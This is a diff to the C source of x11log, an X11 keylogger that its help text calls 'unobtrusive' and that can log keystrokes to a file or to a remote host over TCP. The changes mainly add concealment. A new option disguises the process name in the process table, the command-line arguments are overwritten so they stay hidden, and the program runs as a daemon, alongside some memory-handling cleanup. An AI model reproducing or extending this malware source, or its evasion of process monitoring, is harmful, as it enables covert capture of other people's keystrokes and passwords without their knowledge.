@@ -5,6 +5,12 @@
  * This code is licensed under GPLv3.
  * (c) Erik Sonnleitner 2007/2011, es@delta-xi.net
  * www.delta-xi.net
+ *
+ * Known Bugs/TODOs:
+ *   - fatal() doesn't yet free heap memory (logfile, hostname, etc)
+ *   - although cmdline arguments are removed, the TCP port number is still
+ *     shown in the process tree.
+ *   - process_name in obfuscation mode shouldn't be statically defined
  * */
 
 #include <stdio.h>
@@ -41,6 +47,7 @@ static FILE *output;
 static XModifierKeymap *map;
 static Display *dsp;
 static int verbosity = 1;
+static struct opts_struct* options;
 
 
 /* Here we go. */
@@ -49,6 +56,7 @@ int main (int argc, char ** argv) {
 	struct tm *timestart;
 	struct opts_struct opts;
 
+	options = &opts;
 	timestart = initialize(argc, argv, &opts);
 
 	/* NULL defaults to what is given in DISPLAY environment variable. However,
@@ -89,7 +97,7 @@ int main (int argc, char ** argv) {
  * output stream, set default options. Returns time when init() finished.
  * */
 struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
-	int c;
+	int c, i, j;
 	time_t rawtime;
 
 	/* connect signals to handler-functions */
@@ -106,36 +114,48 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 	opts->host = NULL;
 	opts->port = 0;
 	opts->daemonize = 0;
+	opts->obfuscate = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "d:f:h?r:sb")) != -1){
+	while((c = getopt(argc, argv, "s:f:h?r:qdo")) != -1){
 		switch(c) {
-			case 'd':
-				opts->display = optarg;
+			case 's':
+				if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
+					break;
+
+				opts->display = smalloc(sizeof(char) * strlen(optarg) + 1);
+				strncpy(opts->display, optarg, strlen(optarg));
 				break;
 			case 'f':
-				opts->logfile = optarg;
+				opts->logfile = smalloc(sizeof(char) * strlen(optarg) + 1);
+				strncpy(opts->logfile, optarg, strlen(optarg));
 				break;
 			case 'r':
 				opts->remote_addr = optarg;
 				opts->log_remote = 1;
 				break;
-			case 's':
+			case 'q':
 				opts->silent = 1;
 				verbosity = 0;
 				break;
-			case 'b':
+			case 'd':
 				opts->daemonize = 1;
+				break;
+			case 'o':
+				opts->obfuscate= 1;
 				break;
 			case 'h':
 			case '?':
-				log(0, stderr, " usage: %s [OPTION]\n", argv[0]);
+				log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
+				log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
 				log(0, stderr, " Available options:\n");
-				log(0, stderr, "\t-d <DISPLAY>   X-Display to use, default is :0.0\n");
-				log(0, stderr, "\t-f <LOGFILE>   Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
-				log(0, stderr, "\t-r <HOST:PORT> Log keystrokes to remote host. The other end needs a listening daemon on given port\n\t\t\t(e.g. using netcat: 'nc -p <port> -k')\n");
-				log(0, stderr, "\t-b             Daemonize (requires -f or -r or both).\n");
-				log(0, stderr, "\t-s             Be silent (no stdout).\n");
+				log(0, stderr, "\t-s <DISPLAY>    X-Display to use, default is :0.0\n");
+				log(0, stderr, "\t-f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
+				log(0, stderr, "\t-r <HOST:PORT>  Log keystrokes to remote host. The other end needs a program listening on specified\n\t\t\tTCP port (e.g. using BSD netcat: 'nc -p <port> -k')\n");
+				log(0, stderr, "\t-d              Daemonize (requires -f or -r or both).\n");
+				log(0, stderr, "\t-q              Be quiet (no output to console).\n");
+				log(0, stderr, "\t-o              Obfuscate process name in process table.\n");
+				log(0, stderr, "\t-h|-?           Print usage.\n");
 
 				exit(EXIT_FAILURE);
 			default:
@@ -145,20 +165,16 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 
 	/* logical constraints */
 	if(opts->silent && !(opts->log_remote || opts->logfile))
-		fatal("Argument -s requires either -r or -f");
+		fatal("Argument -q requires either logging to file or remote host (-r|-f)");
 	if(opts->daemonize && !(opts->log_remote || opts->logfile))
-		fatal("Argument -b requires either -r or -f");
-
-	/* to daemonize or not to daemonize */
-	if(opts->daemonize)
-		daemonize();
+		fatal("Argument -d requires either logging to file or remote host (-r|-f)");
+	if(opts->obfuscate && !opts->daemonize)
+		fatal("Argument -o requires daemonization (-d)");
 
 	/* log to file if given, use stdout otherwise  */
 	if(opts->logfile == NULL) {
-		log(1, stderr, "Logging to stdout\n");
 		output = stdout;
 	} else {
-		log(1, stderr, "Logging to file %s\n", opts->logfile);
 		output = fopen(opts->logfile, "a");
 		if(!output) {
 			log(1, stderr, "Error writing to %s, fallback to console.\n", argv[1]);
@@ -170,7 +186,10 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 	if((opts->remote_addr != NULL)
 		&& (strstr(opts->remote_addr, ":") != NULL) && opts->log_remote) {
 
-		opts->host = strtok(opts->remote_addr, ":");
+		char* host_tmp = strtok(opts->remote_addr, ":");
+		opts->host = smalloc(sizeof(char) * strlen(host_tmp) + 1);
+		strncpy(opts->host, host_tmp, strlen(host_tmp));
+
 		opts->port = atol( strtok(NULL, ":") );
 
 		if(opts->port < TCP_PORT_MIN || opts->port > TCP_PORT_MAX)
@@ -179,6 +198,14 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 		fatal("Illegal argument for remote logging");
 	}
 
+	/* to daemonize or not to daemonize */
+	if(opts->daemonize)
+		daemonize((opts->obfuscate) ? argv[0] : NULL);
+
+	/* cmdline arguments are always hidden */
+	for(i = 1; i < argc; i++)
+		for (j = 0; j < strlen(argv[i]); j++)
+			argv[i][j] = ' ';
 
 	/* just for logging */
 	rawtime = time(NULL);
@@ -275,6 +302,13 @@ void signal_handler(int sig) {
 		if(output != stdout)
 			fclose(output);
 
+		if( strcmp(options->display, X_DEFAULT_DISPLAY) != 0)
+			free( options->display );
+		if( options->host != NULL )
+			free( options->host );
+		if( options->logfile != NULL )
+			free( options->logfile );
+
 		exit(EXIT_SUCCESS);
 	  //SIGHUP forces flushing of buffer
 	  case(SIGHUP):
@@ -340,7 +374,11 @@ void log(int level, FILE* stream, const char *fmt, ...) {
 }
 
 
-int daemonize(){
+/**
+ * Daemonize logger. If a process_name is given, the name of the newly created
+ * child as it appears within the process table, is altered.
+ * */
+int daemonize(char* child_process_name){
 	pid_t pid, sid;
 	
 	pid  = fork();
@@ -359,9 +397,27 @@ int daemonize(){
 	if(chdir("/") < 0)
 		fatal("Error setting work directory to /");
 	
+	/* process name obfuscation */
+	if(child_process_name != NULL) {
+		int process_name_len = strlen(child_process_name);
+		strncpy(child_process_name, PROCESS_FAKE_NAME, process_name_len);
+	}
+
 	close(STDIN_FILENO);
 	close(STDOUT_FILENO);
 	close(STDERR_FILENO);
 
 	return pid;
+}
+
+/**
+ * Secure malloc
+ * */
+void* smalloc(size_t size) {
+	void* ptr;
+	
+	if((ptr = malloc(size)) == NULL)
+		fatal("Unable to allocate memory");
+
+	return ptr;
 }
